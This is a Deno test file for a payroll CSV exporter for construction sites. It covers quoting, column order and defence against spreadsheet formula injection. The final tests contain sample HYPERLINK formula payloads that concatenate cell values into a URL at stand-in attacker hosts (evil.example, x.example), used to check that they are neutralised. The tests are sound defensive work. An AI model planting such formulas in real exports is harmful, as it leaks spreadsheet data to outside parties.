import { assertEquals } from '@std/assert';
import {
  buildPayrollRows,
  csvEscape,
  formatHours,
  normalizePayrollColumns,
  PAYROLL_COLUMNS,
  payrollCsv,
  payrollFileName,
  toCsv,
} from './csv.ts';

Deno.test('csvEscape quotes commas, quotes and newlines only', () => {
  assertEquals(csvEscape('Delta Mechanical'), 'Delta Mechanical');
  assertEquals(csvEscape('Riverside Lofts, Block B'), '"Riverside Lofts, Block B"');
  assertEquals(csvEscape('say "hi"'), '"say ""hi"""');
  assertEquals(csvEscape('a\nb'), '"a\nb"');
  assertEquals(csvEscape(7), '7');
  assertEquals(csvEscape(null), '');
  assertEquals(csvEscape(undefined), '');
});

Deno.test('toCsv writes a header and CRLF line endings', () => {
  assertEquals(
    toCsv(
      ['a', 'b'],
      [
        [1, 'x,y'],
        [null, 'z'],
      ],
    ),
    'a,b\r\n1,"x,y"\r\n,z\r\n',
  );
});

Deno.test('formatHours drops trailing zeros and rounds to 2 decimals', () => {
  assertEquals(formatHours(44), '44');
  assertEquals(formatHours(3.5), '3.5');
  assertEquals(formatHours(1 / 3), '0.33');
  assertEquals(formatHours(192.25), '192.25');
});

const sites = [
  { id: 's1', name: 'Riverside Lofts — Block B', project_code: 'RL-2041' },
  { id: 's2', name: 'Elm St. Townhomes', project_code: 'ES-310' },
];
const companies = [
  { id: 'c1', name: 'Delta Mechanical', trade: 'HVAC', status: 'confirmed' },
  { id: 'c2', name: 'Ridgeway', trade: null, status: 'unconfirmed' },
];
const entries = [
  {
    date: '2026-10-06',
    site_id: 's1',
    company_id: 'c1',
    company_name: 'Delta Mechanical',
    company_name_heard: 'the Delta guys',
    trade: null,
    workers: 6,
    hours: 48,
    report_no: 'RL-2041-0187',
    version: 2,
  },
  {
    date: '2026-10-05',
    site_id: 's2',
    company_id: 'c2',
    company_name: 'Ridgeway',
    company_name_heard: 'Ridgeway',
    trade: 'Framing',
    workers: 4,
    hours: 32,
    report_no: 'ES-310-0042',
    version: 1,
  },
  {
    date: '2026-10-05',
    site_id: 's1',
    company_id: null,
    company_name: null,
    company_name_heard: 'the painters',
    trade: 'Painting',
    workers: 2,
    hours: 7.5,
    report_no: 'RL-2041-0186',
    version: 1,
  },
  {
    date: '2026-10-05',
    site_id: 's1',
    company_id: 'c1',
    company_name: 'Delta Mechanical',
    company_name_heard: null,
    trade: 'HVAC',
    workers: 5,
    hours: 40,
    report_no: 'RL-2041-0186',
    version: 1,
  },
];

Deno.test('buildPayrollRows joins, sorts and resolves names; unconfirmed rows are optional', () => {
  const all = buildPayrollRows(entries, sites, companies, { includeUnconfirmed: true });
  assertEquals(
    all.map((r) => [r.date, r.site, r.company, r.trade, r.hours]),
    [
      ['2026-10-05', 'Elm St. Townhomes', 'Ridgeway', 'Framing', '32'],
      ['2026-10-05', 'Riverside Lofts — Block B', 'Delta Mechanical', 'HVAC', '40'],
      ['2026-10-05', 'Riverside Lofts — Block B', 'the painters', 'Painting', '7.5'],
      ['2026-10-06', 'Riverside Lofts — Block B', 'Delta Mechanical', 'HVAC', '48'],
    ],
  );
  const confirmedOnly = buildPayrollRows(entries, sites, companies, { includeUnconfirmed: false });
  assertEquals(
    confirmedOnly.map((r) => r.company),
    ['Delta Mechanical', 'Delta Mechanical'],
  );
});

Deno.test('payrollCsv has exactly the spec columns in order', () => {
  assertEquals(
    [...PAYROLL_COLUMNS],
    [
      'date',
      'site',
      'project_code',
      'company',
      'trade',
      'workers',
      'hours',
      'report_no',
      'version',
    ],
  );
  const rows = buildPayrollRows([entries[0]!], sites, companies, { includeUnconfirmed: false });
  assertEquals(
    payrollCsv(rows),
    'date,site,project_code,company,trade,workers,hours,report_no,version\r\n' +
      '2026-10-06,Riverside Lofts — Block B,RL-2041,Delta Mechanical,HVAC,6,48,RL-2041-0187,2\r\n',
  );
  assertEquals(payrollFileName('2026-W41'), 'payroll_2026-W41.csv');
});

Deno.test('payrollCsv follows the org column order (org_settings.payroll_columns)', () => {
  const rows = buildPayrollRows([entries[0]!], sites, companies, { includeUnconfirmed: false });
  assertEquals(
    payrollCsv(rows, [
      'company',
      'hours',
      'date',
      'site',
      'project_code',
      'trade',
      'workers',
      'report_no',
      'version',
    ]),
    'company,hours,date,site,project_code,trade,workers,report_no,version\r\n' +
      'Delta Mechanical,48,2026-10-06,Riverside Lofts — Block B,RL-2041,HVAC,6,RL-2041-0187,2\r\n',
  );
});

Deno.test(
  'payrollCsv normalises a stored order: unknown and duplicate names out, missing appended',
  () => {
    const header = (order: readonly string[] | null | undefined) =>
      payrollCsv([], order).split('\r\n')[0];
    assertEquals(header(null), PAYROLL_COLUMNS.join(','));
    assertEquals(header(undefined), PAYROLL_COLUMNS.join(','));
    assertEquals(
      header(['report_no', 'phone', 'report_no', 'hours']),
      'report_no,hours,date,site,project_code,company,trade,workers,version',
    );
    assertEquals(normalizePayrollColumns(['version']).length, PAYROLL_COLUMNS.length);
  },
);

// W3-06 · audit "Payroll CSV does not neutralise spreadsheet formulas…" (OWASP CSV injection).
Deno.test('csvEscape prefixes text that starts like a formula; numbers stay plain', () => {
  assertEquals(
    csvEscape('=HYPERLINK("https://evil.example/?d="&B2&C2,"Delta Electric")'),
    '"\'=HYPERLINK(""https://evil.example/?d=""&B2&C2,""Delta Electric"")"',
  );
  assertEquals(csvEscape('+1'), "'+1");
  assertEquals(csvEscape('-1'), "'-1");
  assertEquals(csvEscape('@SUM(A1:A9)'), "'@SUM(A1:A9)");
  assertEquals(csvEscape('\tTabbed'), "'\tTabbed");
  assertEquals(csvEscape('Delta, Inc'), '"Delta, Inc"');
  assertEquals(csvEscape(-1), '-1');
  assertEquals(csvEscape(6), '6');
});

Deno.test('payrollCsv neutralises a formula in a company, site or trade name', () => {
  const evil = '=HYPERLINK("https://x.example/?"&A2,"Pay")';
  const rows = buildPayrollRows(
    [{ ...entries[0]!, company_id: 'c9', trade: '@SUM(1)' }],
    [{ id: 's1', name: '+Riverside', project_code: '-RL' }],
    [{ id: 'c9', name: evil, trade: null, status: 'confirmed' }],
    { includeUnconfirmed: false },
  );
  assertEquals(
    payrollCsv(rows).split('\r\n')[1],
    `2026-10-06,'+Riverside,'-RL,"'=HYPERLINK(""https://x.example/?""&A2,""Pay"")",'@SUM(1),6,48,RL-2041-0187,2`,
  );
});
